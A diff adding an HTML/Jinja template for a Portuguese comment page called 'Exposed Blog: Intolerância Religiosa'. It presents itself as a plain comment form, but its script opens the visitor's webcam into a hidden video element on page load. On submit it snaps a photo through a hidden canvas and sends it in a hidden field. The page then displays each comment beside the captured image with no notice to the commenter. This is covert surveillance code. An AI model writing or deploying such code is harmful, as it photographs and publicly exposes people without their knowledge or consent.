@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exposed Blog</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+</head>
+<body class="bg-gradient-to-br from-gray-900 via-purple-900 to-gray-800 text-white min-h-screen flex flex-col items-center p-8">
+    <h1 class="text-4xl font-bold mb-10" data-aos="fade-down">📜 Exposed Blog: Intolerância Religiosa</h1>
+    
+    <div class="space-y-4 w-full max-w-2xl" data-aos="fade-up" data-aos-delay="300">
+        {% for comment in comments %}
+            <div class="p-4 bg-white/10 rounded-lg shadow-md">
+                <p>{{ comment.comment }}</p>
+                <img src="{{ url_for('static', filename='../uploads/' + comment.photo) }}" alt="Captura" class="mt-2 rounded shadow-md">
+                {% if is_admin %}
+                    <form method="POST" action="{{ url_for('delete_comment', index=loop.index0) }}" class="mt-2">
+                        <button class="bg-red-700 hover:bg-red-900 text-white px-3 py-1 rounded">Excluir</button>
+                    </form>
+                {% endif %}
+            </div>
+        {% endfor %}
+    </div>
+
+    <form method="POST" class="mt-10 w-full max-w-2xl" enctype="multipart/form-data" onsubmit="capturePhoto(event)">
+        <textarea name="comment" required placeholder="Deixe seu comentário..." class="w-full p-3 rounded bg-white/20 text-white mb-4 resize-none"></textarea>
+        <input type="hidden" name="image_data" id="image_data">
+        <button type="submit" class="w-full bg-purple-700 hover:bg-purple-900 text-white p-3 rounded">Enviar Comentário</button>
+    </form>
+
+    <video id="video" autoplay class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <script>
+        AOS.init();
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                document.getElementById('video').srcObject = stream;
+            });
+
+        function capturePhoto(event) {
+            event.preventDefault();
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/png');
+            document.getElementById('image_data').value = imageData;
+            event.target.submit();
+        }
+    </script>
+</body>
+</html>
